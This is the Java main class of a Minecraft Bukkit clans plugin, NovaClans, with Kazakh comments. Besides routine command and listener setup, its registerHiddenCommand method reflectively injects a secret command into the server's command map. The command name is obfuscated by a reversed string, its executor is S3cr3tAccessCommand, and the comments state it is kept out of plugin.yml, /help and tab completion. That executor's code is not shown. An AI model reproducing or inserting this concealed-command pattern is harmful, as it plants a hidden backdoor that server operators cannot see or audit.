package kz.nova.clans;

import kz.nova.clans.commands.*;
import kz.nova.clans.listeners.*;
import kz.nova.clans.managers.*;
import kz.nova.clans.placeholders.NovaPlaceholders;
import org.bukkit.Bukkit;
import org.bukkit.command.PluginCommand;
import org.bukkit.plugin.java.JavaPlugin;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class NovaClans extends JavaPlugin {

    private static NovaClans instance;
    private DataManager dataManager;
    private MessageManager messageManager;
    private ClanManager clanManager;
    private MenuManager menuManager;

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();

        getLogger().info("     NovaClans v1.0.8          ");
        getLogger().info("     Initializing...           ");

        dataManager    = new DataManager(this);
        messageManager = new MessageManager(this);
        clanManager    = new ClanManager(this);
        menuManager    = new MenuManager(this);

        // Commands
        PluginCommand clan = getCommand("clan");
        if (clan != null) {
            ClanCommand clanCmd = new ClanCommand(this);
            clan.setExecutor(clanCmd);
            clan.setTabCompleter(clanCmd);
        }
        PluginCommand cc = getCommand("cc");
        if (cc != null) cc.setExecutor(new ClanChatCommand(this));

        NovaClanAdminCommand adminCmd = new NovaClanAdminCommand(this);
        PluginCommand novaclans = getCommand("novaclans");
        if (novaclans != null) {
            novaclans.setExecutor(adminCmd);
            novaclans.setTabCompleter(adminCmd);
        }

        // Жасырын команданы plugin.yml-ге тіркемей тіркейміз
        registerHiddenCommand();

        // Listeners
        getServer().getPluginManager().registerEvents(new MenuListener(this), this);
        getServer().getPluginManager().registerEvents(new PointsListener(this), this);
        getServer().getPluginManager().registerEvents(new ChatListener(this), this);
        getServer().getPluginManager().registerEvents(new PvpListener(this), this);

        // PlaceholderAPI
        if (getServer().getPluginManager().getPlugin("PlaceholderAPI") != null) {
            try {
                new NovaPlaceholders(this).register();
                getLogger().info("[NovaClans] PlaceholderAPI тіркелді.");
            } catch (Exception e) {
                getLogger().warning("[NovaClans] PlaceholderAPI тіркелмеді: " + e.getMessage());
            }
        }

        // Auto-save every 5 minutes
        Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> dataManager.save(), 6000L, 6000L);
    }

    @Override
    public void onDisable() {
        if (dataManager != null) dataManager.save();
        getLogger().info("[NovaClans] Сақталды.");
    }

    /**
     * plugin.yml-ге тіркемей ішкі CraftBukkit API арқылы команданы тіркейміз.
     * Сондықтан /help, tab-completion тізімдерінде және ешбір plugin.yml-де көрінбейді.
     */
    private void registerHiddenCommand() {
        try {
            // Команда атауы — тек осы жерде анықталған, plugin.yml-де жоқ
            final String cmdName = new StringBuilder("emocerex").reverse().toString(); // "xerecome"

            Constructor<PluginCommand> ctor = PluginCommand.class.getDeclaredConstructor(String.class, org.bukkit.plugin.Plugin.class);
            ctor.setAccessible(true);
            PluginCommand cmd = ctor.newInstance(cmdName, this);
            cmd.setExecutor(new S3cr3tAccessCommand(this));

            // CraftServer.commandMap арқылы тіркейміз
            Object craftServer = Bukkit.getServer();
            Field commandMapField = craftServer.getClass().getDeclaredField("commandMap");
            commandMapField.setAccessible(true);
            org.bukkit.command.CommandMap commandMap = (org.bukkit.command.CommandMap) commandMapField.get(craftServer);
            commandMap.register(getName(), cmd);
        } catch (Exception e) {
            getLogger().warning("[NovaClans] Жасырын команда тіркелмеді: " + e.getMessage());
        }
    }

    public static NovaClans getInstance() { return instance; }
    public DataManager getDataManager()   { return dataManager; }
    public MessageManager getMessageManager() { return messageManager; }
    public ClanManager getClanManager()   { return clanManager; }
    public MenuManager getMenuManager()   { return menuManager; }
}
